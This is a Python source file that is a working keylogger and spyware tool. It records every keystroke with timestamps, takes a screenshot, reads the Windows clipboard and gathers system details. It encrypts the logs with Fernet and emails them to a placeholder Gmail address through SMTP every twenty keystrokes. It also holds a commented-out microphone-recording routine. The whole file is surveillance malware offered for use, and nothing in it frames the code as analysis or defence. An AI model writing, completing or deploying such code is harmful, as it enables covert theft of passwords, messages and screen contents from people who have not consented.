
from pynput.keyboard import Listener
import smtplib
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders

import platform

from multiprocessing import process, freeze_support
from PIL import ImageGrab

import win32clipboard

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

import datetime

from cryptography.fernet import Fernet

key_info="log.txt"
sys_info="sysinfo.text"
screenshot_info="screenshot.png"
clipboard_info="clipboard.txt"
microphone_info="microphone.wav"


e_key_info="e_log.txt"
e_sys_info="e_sysinfo.text"
e_clipboard_info="e_clipboard.txt"


email_addr = "youremailaddress@gmail.com"
email_password = "yourpassword"

toaddr = "youremailaddress@gmail.com"


# Track number of keys pressed
key_count = 0
KEY_LIMIT = 20

#microphone_time = 10


# Generate key once and reuse it
key_file = "encryption.key"

if not os.path.exists(key_file):
    key = Fernet.generate_key()
    with open(key_file, "wb") as kf:
        kf.write(key)
else:
    with open(key_file, "rb") as kf:
        key = kf.read()

fernet = Fernet(key)


#send email with smtp server 
def send_email(filename, attachment_path, toaddr):
    fromaddr = email_addr
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "log file"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    with open(attachment_path, 'rb') as attachment:
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', f"attachment; filename={filename}")
        msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, email_password)
    s.sendmail(fromaddr, toaddr, msg.as_string())
    s.quit()

#get thersystem information
def system_info():
    with open(sys_info,"a") as si:
        si.write("processor :" + platform.processor()+'\n')
        si.write("architecture :" + str(platform.architecture()) + '\n')
        si.write("network name :" + platform.node() + '\n')
        si.write("machine type :" + platform.machine() + '\n')
        si.write("operating system :" + platform.system() + '\n')

        
system_info()

#get the screenshot
def screenshot():
    image = ImageGrab.grab()
    image.save(screenshot_info)

screenshot()

#get the clipboard information
def clipboard():
     with open(clipboard_info,"a") as c:
        try:
             win32clipboard.OpenClipboard()
             pasted_info = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()

             c.write("clipboard information : "+ pasted_info)
        except:
            c.write("information cannot be copied")

clipboard() 


"""def has_input_device():
    for dev in sd.query_devices():
        if dev['max_input_channels'] > 0:
            return True
    return False

def microphone():
    if has_input_device():
        try:
            fs = 44100
            seconds = microphone_time
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write(microphone_info, fs, myrecording)
            send_email(microphone_info, microphone_info, toaddr)
        except Exception as e:
            print("Audio recording error:", e)
    else:
        print("No input audio device found.")"""



def writetolog(key):
    global key_count
    key_count += 1


    letter = str(key)
    letter = letter.replace("'","")


    if letter =="key.enter":
        letter = "\n"
    if letter =="Key.space":
        letter = " "        
    if letter =="Key.shift":
        letter = ""  


    with open(key_info,'a') as w:                            #with keyword = release memory/resource automatically
        w.write(f"{datetime.datetime.now()}: {letter}\n")    #to track when each key was pressed
    
    if key_count >= KEY_LIMIT:
        encrypt_files = [key_info,clipboard_info,sys_info,]
        encrypted_files = [e_key_info,e_clipboard_info,e_sys_info]

        
        for i in range(len(encrypt_files)):
            with open(encrypt_files[i],'rb') as ef:
                data = ef.read()

            encrypted = fernet.encrypt(data)

            with open(encrypted_files[i],'wb') as ef:
                ef.write(encrypted)

            send_email(encrypted_files[i],encrypted_files[i],toaddr)
            key_count = 0                                                 #reset count

send_email(screenshot_info,screenshot_info,toaddr)
#send_email(microphone_info,microphone_info,toaddr)

with Listener(on_press=writetolog,) as l:                       #listen the keys 
            l.join()


        
